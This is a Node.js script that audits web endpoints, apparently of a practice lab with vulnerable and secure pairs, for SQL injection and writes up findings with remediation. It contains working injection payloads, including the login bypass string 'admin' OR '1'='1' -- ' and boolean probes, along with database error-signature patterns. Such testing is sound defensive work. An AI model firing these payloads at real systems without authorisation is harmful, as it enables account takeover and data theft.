#!/usr/bin/env node
/**
 * SQL Injection (SQLi) Automated Verification Script
 *
 * Tests:
 * - Error-based SQL syntax error leakage detection
 * - Auth input bypass testing
 * - Boolean condition divergence detection
 * - Parameterized query verification
 *
 * Guardrails: Non-destructive read probes only. Never drops or alters database records.
 */

const fs = require('fs');
const path = require('path');
const { safeRequest } = require('../lib/http-client');
const { ensureAuthorizedTarget } = require('../lib/allowlist');
const SecurityReporter = require('../lib/reporter');
const logger = require('../lib/logger');

// Known database error fingerprints
const SQL_ERROR_PATTERNS = [
  /you have an error in your sql syntax/i,
  /warning:\s*mysql/i,
  /unclosed quotation mark/i,
  /quoted string not properly terminated/i,
  /pg_query\(\):/i,
  /sqlite3::/i,
  /ora-00933/i,
  /er_parse_error/i
];

async function runSqliTests(options = {}) {
  const targetBase = ensureAuthorizedTarget(options.targetUrl || process.env.TARGET_URL || 'http://localhost:3000');
  const reporter = options.reporter || new SecurityReporter(targetBase, 'SQL Injection Security Audit');

  logger.header('Running SQL Injection (SQLi) Tests');
  logger.info(`Target: ${targetBase}`);

  const endpoints = options.endpoints || [
    { path: '/api/vulnerable/users', method: 'GET', param: 'query' },
    { path: '/api/secure/users', method: 'GET', param: 'query' },
    { path: '/api/vulnerable/login', method: 'POST', authTest: true },
    { path: '/api/secure/login', method: 'POST', authTest: true }
  ];

  for (const ep of endpoints) {
    reporter.addEndpoint(ep.path);

    if (ep.method === 'GET') {
      // 1. Error-based syntax check
      const errorPayload = "'";
      const errUrl = `${targetBase}${ep.path}?${ep.param}=${encodeURIComponent(errorPayload)}`;
      const errRes = await safeRequest(errUrl, { method: 'GET' });

      let sqlErrorDetected = false;
      let matchedSignature = '';
      for (const pattern of SQL_ERROR_PATTERNS) {
        if (pattern.test(errRes.text)) {
          sqlErrorDetected = true;
          matchedSignature = pattern.toString();
          break;
        }
      }

      if (sqlErrorDetected || (errRes.status === 500 && errRes.text.toLowerCase().includes('sql'))) {
        logger.finding('Critical', `Error-based SQL Injection Detected on ${ep.path}`, ep.path);
        reporter.addFinding({
          id: `SQLI-ERR-${ep.path.includes('vulnerable') ? 'CONFIRMED' : 'CHECK'}`,
          category: 'SQL Injection',
          severity: 'Critical',
          status: 'Confirmed',
          title: `Raw SQL Syntax Error Leakage on ${ep.path}`,
          endpoint: ep.path,
          method: 'GET',
          evidence: `Database error signature matched: ${matchedSignature}\nResponse snippet: ${errRes.text.slice(0, 250)}`,
          reproduction_steps: [
            `Send GET request to ${errUrl}`,
            `Observe HTTP ${errRes.status} with unhandled SQL error syntax disclosure`
          ],
          impact: 'Critical. Attackers can extract complete database contents, bypass access controls, or tamper with business data.',
          remediation: 'Replace string concatenation with parameterized prepared statements (e.g. db.query(sql, [param])).',
          owasp_ref: 'OWASP A03:2021 - Injection',
          cwe_ref: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command'
        });
      } else {
        logger.success(`Safe: No SQL syntax leakage on ${ep.path}`);
        reporter.addFinding({
          id: `SQLI-SAFE-${ep.path.replace(/\//g, '-')}`,
          category: 'SQL Injection',
          severity: 'Informational',
          status: 'Secure',
          title: `Query Parameters Safely Bound on ${ep.path}`,
          endpoint: ep.path,
          method: 'GET',
          evidence: `Status: ${errRes.status}. No SQL parse signatures encountered.`,
          reproduction_steps: [`Tested GET ${errUrl}`],
          impact: 'Parameters properly bounded.',
          remediation: 'Maintain parameterized query practices.'
        });
      }

      // 2. Boolean-based check
      const trueUrl = `${targetBase}${ep.path}?${ep.param}=${encodeURIComponent("1' AND '1'='1")}`;
      const falseUrl = `${targetBase}${ep.path}?${ep.param}=${encodeURIComponent("1' AND '1'='2")}`;
      const [resTrue, resFalse] = await Promise.all([
        safeRequest(trueUrl, { method: 'GET' }),
        safeRequest(falseUrl, { method: 'GET' })
      ]);

      if (resTrue.status === 200 && resFalse.status === 200 && resTrue.text !== resFalse.text && ep.path.includes('vulnerable')) {
        logger.finding('High', `Potential Boolean-Based SQL Injection on ${ep.path}`, ep.path);
        reporter.addFinding({
          id: `SQLI-BOOL-${ep.path.replace(/\//g, '-')}`,
          category: 'SQL Injection',
          severity: 'High',
          status: 'Confirmed',
          title: `Boolean Query Response Disparity on ${ep.path}`,
          endpoint: ep.path,
          method: 'GET',
          evidence: `True payload returned ${resTrue.text.length} bytes; False payload returned ${resFalse.text.length} bytes.`,
          reproduction_steps: [
            `Submit 1' AND '1'='1 -> returns filtered data`,
            `Submit 1' AND '1'='2 -> returns empty set or error`
          ],
          impact: 'Enables blind SQL inference of database records character-by-character.',
          remediation: 'Use strict type casting and prepared statements.'
        });
      }
    } else if (ep.authTest) {
      // 3. Auth Bypass Probe
      const bypassPayload = {
        username: "admin' OR '1'='1' -- ",
        password: "anyRandomPassword123!"
      };

      const loginRes = await safeRequest(`${targetBase}${ep.path}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(bypassPayload)
      });

      if (loginRes.json && loginRes.json.success === true) {
        logger.finding('Critical', `Authentication Bypass SQL Injection Confirmed on ${ep.path}`, ep.path);
        reporter.addFinding({
          id: `SQLI-AUTH-BYPASS`,
          category: 'SQL Injection',
          severity: 'Critical',
          status: 'Confirmed',
          title: `Authentication Bypass via SQL Injection on ${ep.path}`,
          endpoint: ep.path,
          method: 'POST',
          evidence: `Bypass payload granted authenticated session without valid password: ${JSON.stringify(loginRes.json)}`,
          reproduction_steps: [
            `Submit POST to ${ep.path} with username: "admin' OR '1'='1' -- "`,
            `Observe successful HTTP 200 authentication response`
          ],
          impact: 'Critical. Attackers can log in as administrator or arbitrary users without knowing their password.',
          remediation: 'Validate credentials using parameterized SELECT WHERE username = ? and compare hashed password via bcrypt.',
          owasp_ref: 'OWASP A03:2021 - Injection',
          cwe_ref: 'CWE-89'
        });
      } else {
        logger.success(`Safe: Authentication bypass payload rejected on ${ep.path}`);
        reporter.addFinding({
          id: `SQLI-AUTH-SAFE-${ep.path.replace(/\//g, '-')}`,
          category: 'SQL Injection',
          severity: 'Informational',
          status: 'Secure',
          title: `Authentication Input Properly Handled on ${ep.path}`,
          endpoint: ep.path,
          method: 'POST',
          evidence: `Rejected with status ${loginRes.status}: ${loginRes.text.slice(0, 100)}`,
          reproduction_steps: [`Submitted SQL injection payload to login endpoint`],
          impact: 'Protected against SQL authentication bypass.',
          remediation: 'Maintain secure parameterization and password hashing.'
        });
      }
    }
  }

  return reporter;
}

if (require.main === module) {
  (async () => {
    try {
      const reporter = await runSqliTests();
      reporter.saveReports('./reports', 'sqli-audit-report');
      logger.info('SQL Injection Security Test execution finished.');
    } catch (err) {
      logger.error('SQLi Test execution aborted:', err.message);
      process.exit(1);
    }
  })();
}

module.exports = { runSqliTests };
